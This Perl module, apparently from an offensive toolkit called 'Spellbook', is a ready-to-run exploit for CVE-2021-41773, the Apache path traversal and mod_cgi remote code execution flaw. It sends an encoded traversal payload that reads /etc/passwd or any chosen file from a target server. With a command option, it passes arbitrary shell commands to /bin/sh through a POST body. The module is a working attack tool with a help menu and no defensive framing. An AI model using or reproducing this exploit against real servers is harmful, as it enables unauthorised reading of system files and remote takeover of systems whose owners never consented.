package Spellbook::Advisory::CVE_2021_41773 {
    use strict;
    use warnings;
    use Spellbook::Core::UserAgent;

    our $VERSION = '0.0.2';

    sub new {
        my ($self, $parameters) = @_;
        my ($help, $target, $file, $command);

        Getopt::Long::GetOptionsFromArray (
            $parameters,
            'h|help'      => \$help,
            't|target=s'  => \$target,
            'f|file=s'    => \$file,
            'c|command=s' => \$command
        );

        if ($target) {
            if ($target !~ /^https?:\/\//xsm) {
                $target = "https://$target";
            }

            if (!$file) {
                $file = '/etc/passwd';
            }

            my $payload = '/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e';
            my $useragent = Spellbook::Core::UserAgent -> new();
            my $request;

            if ($command) {
                $request = $useragent -> post(
                    $target . $payload . '/bin/sh',
                    'Content' => "foo=|echo;$command"
                );
            }

            if (!$command) {
                $request = $useragent -> get($target . $payload . $file);
            }

            if ($request -> is_success) {
                return $request -> content();
            }

            return 0;
        }

        if ($help) {
            return "\n"
                . "                \rAdvisory::CVE_2021_41773\n"
                . "                \r========================\n"
                . "                \r-h, --help     See this menu\n"
                . "                \r-t, --target   Define a target\n"
                . "                \r-f, --file     Define a file to read (default: /etc/passwd)\n"
                . "                \r-c, --command  Command to execute via mod_cgi RCE\n\n";
        }

        return 0;
    }
}

1;
